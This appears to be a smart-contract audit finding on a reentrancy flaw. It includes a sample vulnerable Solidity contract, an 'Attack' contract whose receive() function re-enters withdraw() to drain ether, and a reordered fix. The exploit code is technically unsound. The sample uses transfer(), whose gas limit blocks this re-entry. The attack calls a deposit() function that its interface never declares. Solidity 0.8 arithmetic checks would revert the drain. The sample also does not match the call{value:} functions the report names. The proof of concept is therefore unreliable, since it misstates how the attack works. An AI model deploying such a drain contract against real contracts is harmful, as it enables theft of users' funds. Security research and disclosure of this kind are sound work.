# Reentrancy Vulnerability in Contract

Reentrancy allows an attacker to re-enter the contract through a fallback function during the execution of a transaction, causing the contract to potentially perform unintended operations. This could lead to the loss of funds, unauthorized access to sensitive data, or manipulation of contract state.
This contract is vulnerable to reentrancy attacks due to the usage of call{value: } for transferring funds and interacting with other external contracts without properly updating the contract's state before the transfer. There are instances where external calls are made with call{value: } and other interactions that could be subject to reentrancy attacks. these functions in particular are vulnerable:
    * withDraw (uses call{value:} to transfer ETH)
    *_withdraw (uses call{value:} for sending ETH)
A reentrancy attack could happen if, during the execution of a function, an external contract calls back into the contract before the state variables are updated (for example, before the collateral values are updated in _withdraw). This could lead to the loss of funds, unauthorized access to sensitive data, or manipulation of contract state.
Here is my proof of concept:
this is the original contract:

pragma solidity ^0.8.0;

contract Vulnerable {
    mapping(address => uint256) public balances;
    
    // Deposit function
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // Withdraw function vulnerable to reentrancy
    function withdraw(uint256 _amount) external {
        // Check if the user has enough balance
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // Transfer the amount to the user (no state update before transfer)
        payable(msg.sender).transfer(_amount);

        // Update the balance after the transfer (vulnerable state)
        balances[msg.sender] -= _amount;
    }
}

The withdraw() function is vulnerable because it transfers the balance before updating the state (i.e., the balances[msg.sender] -= _amount; line comes after the transfer). This opens the door for a hacker to deploy a malicious contract that exploits the reentrancy vulnerability by repeatedly calling the withdraw() function of the Vulnerable contract during its execution to drain funds.

here is an example of such a malicious code:
pragma solidity ^0.8.0;

interface IVulnerable {
    function withdraw(uint256 _amount) external;
}

contract Attack {
    IVulnerable public vulnerableContract;
    
    // Set the address of the vulnerable contract
    constructor(address _vulnerableAddress) {
        vulnerableContract = IVulnerable(_vulnerableAddress);
    }

    // Fallback function that is called when the attacker receives Ether
    receive() external payable {
        // Reentrancy attack: Call withdraw again during the transfer
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    // Start the attack by depositing funds into the vulnerable contract
    function startAttack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ether");
        
        // Deposit into the vulnerable contract
        vulnerableContract.deposit{value: msg.value}();
        
        // Initiate the withdrawal (attack starts here)
        vulnerableContract.withdraw(1 ether);
    }
}

If a malicious contract such as this is deployed and pointed towards the address of the vulnerable contract, it's attack can be executed if the hacker sends at least 1 ETH to the malicious contract via startAttack(). The malicious contract will deposits this ETH into the vulnerable contract and then calls the withdraw() function. When the withdraw() function is called in the vulnerable contract, it will transfer the 1 ETH to the malicious contract. The malicious contract's receive() function is triggered, which calls withdraw() again on the vulnerable contract before the state is updated, draining funds from the vulnerable contract.

To fix this vulnerability, the state should always be updated before transferring funds to the user. Here is a safer version of the withdraw() function:

function withdraw(uint256 _amount) external {
    // Check if the user has enough balance
    require(balances[msg.sender] >= _amount, "Insufficient balance");

    // Update the balance before transferring funds
    balances[msg.sender] -= _amount;

    // Transfer the amount to the user
    payable(msg.sender).transfer(_amount);
}

Thank you. I hope this is helpful.
